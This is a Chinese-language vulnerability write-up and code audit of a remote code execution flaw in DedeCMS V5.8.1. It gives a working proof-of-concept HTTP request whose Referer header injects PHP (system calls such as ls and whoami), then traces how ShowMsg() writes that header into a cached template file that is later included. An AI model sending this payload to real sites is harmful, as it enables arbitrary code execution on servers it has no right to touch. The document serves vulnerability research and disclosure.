# dedecms前端RCE 漏洞

#### 一、版本信息

dedecms V5.8.1

#### 二、poc

    
    
    GET /plus/flink.php?dopost=save HTTP/1.1
    Host: www.dede.com:8003
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Referer:<?php "system"(ls);?>
    

#### 三、利用过程

![image](https://image.3001.net/images/20220412/1649754571_625541cb9ada5e542a1b0.png!small)

#### 四、代码审计（原理）

1、poc主要是控制referer传入参数，直接找目标代码块，全局搜索哪些函数使用了$_SERVER['HTTP_REFERER']代码，

![image](https://image.3001.net/images/20220412/1649754591_625541df22ab3c7e81d2b.png!small)

在ShowMsg()函数中先判断$gourl是否等于-1，如果等于-1则进入if代码块，判断referer参数是否有值，如果有传入的值则将值赋值给$gourl变量。这里的referer没有进行任何过滤，而且是可控参数，我们可以构造恶意payload进行攻击，具体构造什么样的payload，产生什么效果看后续代码。

2、查看有那些函数调用了ShowMsg这个函数，全局搜索ShowMsg函数，这里拿出/plus/flink.php这个文件看

![image](https://image.3001.net/images/20220412/1649754622_625541fe0ae479f6d1a07.png!small)

主要看这个调用，第二个参数为-1对应ShowMsg函数的第二个参数$gourl，没有传入第三个参数，ShowMsg函数默认使用第三个参数$onlymsg=0,
回到ShowMsg代码块，if判断条件为$gourl==-1的时候referer字段才是可控的，这里刚好满足。

3、接着看ShowMsg函数下边的代码，这段代码涉及细节比较多

![image](https://image.3001.net/images/20220412/1649754649_625542190eb5a25347f36.png!small)

1）、首先，if判断$gourl和$onlymsg的值，根据上述，这里会跳转都else代码块，跟进我们的可控参数$gourl

    
    
    $tgobj = trim(preg_replace('/close::/', '', $gourl));
    

这条语句将$gourl经过正则后去空，赋值给$tgobj变量，这里的正则对我们的poc 中的payload没有影响。

2）、接着我们去看这条语句

    
    
    $func .= "window.parent.document.getElementById('{$tgobj}').style.display='none';\r\n";
    

注意这个 “.=” 等同于 $func=$func .
"window.parent.document.getElementById('{$tgobj}').style.display='none';\r\n",可以看到，可控参数$tgobj被赋值到$func,继续跟进$func，注意
“.=”，$func后续继续拼接了一个函数，我们可以修改代码echo出最后$func的内容。

![image](https://image.3001.net/images/20220412/1649754675_6255423359f879c58d60e.png!small)

    
    
    var pgo=0;
          function JumpUrl(){
            if(pgo==0){ location='<?php "system"(whoami);?>'; pgo=1; }
          }
    

注意我们的poc中的payload已经是出现在$func变量中了

注意：特此声明，window.parent.document.getElementById('{$tgobj}').style.display='none';\r\n这条语句的作用就是将$tgobj内容写到location中，具体工作原理，可以自己去百度，这里不在追溯

继续跟进$func变量，$func变量赋值给$rmsg,$rmsg继续拼接内容到$msg,我们继续查看$msg最终的内容。

![image](https://image.3001.net/images/20220412/1649754697_62554249976d4f76e29fd.png!small)

    
    
    var pgo=0;
    function JumpUrl(){
    	if(pgo==0){ 
    		location='<?php "system"(whoami);?>';
            pgo=1; 
    		}
    }
    
    document.write("<div style='height:130px;font-size:10pt;background:#ffffff'><br />");
    document.write("验证码不正确!");
    document.write("<br /><a href='<?php "system"(whoami);?>'>如果你的浏览器没反应，请点击这里...</a><br/></div>");
    setTimeout('JumpUrl()',1000);
    

审计到这里，我的poc 可控参数已经写到了$msg变量中，内容如上，结和前端输出看代码

![image](https://image.3001.net/images/20220412/1649754718_6255425e12fd7bb2b2e12.png!small)

接着延迟1秒，调用JumpUrl函数，在没有恶意payload时，referer字段内容是跳转到本链接的上一个链接，页面正常，但是我们恶意payload后，会执行恶意代码。但是执行恶意代码有个条件需要满足，明显我么这里的恶意代码还只是在$msg变量中存储，我们还需要继续跟进该变量，看其后边是否会写到一个文件中，然后执行该文件。

    
    
    $tpl = new DedeTemplate();
     $tpl->LoadString($msg);
     $tps->Display();
    

这里调用了$msg

3）、我们查看LoadString代码块（注意前边new的对象，查找该类的方法）

![image](https://image.3001.net/images/20220412/1649754738_6255427267c524765fd93.png!small)

我们仔细看这段代码，$str接受了$msg的内容，随之赋值给本类变量$sourceString，接着就对其进行md5加密赋值给$hashcode，圈红的两句是生成文件路径，具体路径直接echo出来就好

    
    
    D:/phpstudy/WWW/DedeCMS-5.8.1/data/tplcache/string_9a6dc6bbd06c9470b296c985d546c480.inc</ br>D:/phpstudy/WWW/DedeCMS-5.8.1/data/tplcache/string_9a6dc6bbd06c9470b296c985d546c480_config.inc
    

文件已经生成，后续肯定会将内容写到文件中，然后执行，继续追溯，想要将内容写到$this->cacheFile这个目录文件中，一定会有针对对这个文件的操作，现在有两个地方是可以去看的，$this->ParseTemplate，和上一步的$tpl->Display().通过查看代码，发现后者有对文件操作的代码

4）、$this->WriteCache很明显就是对cacheFile的操作，继续看它的代码

![image](https://image.3001.net/images/20220412/1649754761_6255428912fb9a4adb937.png!small)

5）、下面是WriteCache方法的代码

![image](https://image.3001.net/images/20220412/1649754780_6255429c407beb852c155.png!small)

![image](https://image.3001.net/images/20220412/1649754800_625542b0c25210997cf07.png!small)

还记得$this->sourceString的内容吗，就是我们上述输出的$msg的内容，后来$mag通过函数传参到$str，$str又赋值给了本类sourceSring变量。好啦，GetResult方法就是获取这段内容，然后通过$fp打开之前生成的文件，然后写入里边。中间有一个过滤CheckDisablePunctions方法，但是通过测试并未进入里边，所有忽略不写了，有兴趣的小伙伴可以进去看一下。

6）、好了终于到最后一步了，生成了文件，内容也写入了，接着就是执行。接上文执行完WriteCache方法后，会返回到Display方法

![image](https://image.3001.net/images/20220412/1649754821_625542c5e7fc4be443596.png!small)

注意到了没，include了这个文件，虽然这个RCE漏洞从未使用到RCE危险函数，但是却可以达到这个目的。

五、总结

其实简单的来描述就是，通过referer字段获取到的参数，通过拼接，形成了一个PHP可执行文件内容，接着就通过创建文件，然后再将内容写到文件中，最后include执行这个文件。

流程总结：

1、referer字段可控，赋值给变量

2、该变量不断拼接一些代码，本意是前端输出提示内容，1秒后跳转由referer提供的链接

3、为了执行这段保存在变量中的代码

4、将这段内容md5加密，将密文作为文件名生成文件

5、将内容写到文件中，最后include这个文件

6、造成RCE漏洞是referer字段可控，恶意生成payload传入，最后包含文件时执行了恶意payload，造成RCE漏洞。

7、理论上我们可以伪造任何php代码，只要是php代码能办到的，这个漏洞统统可以完成。

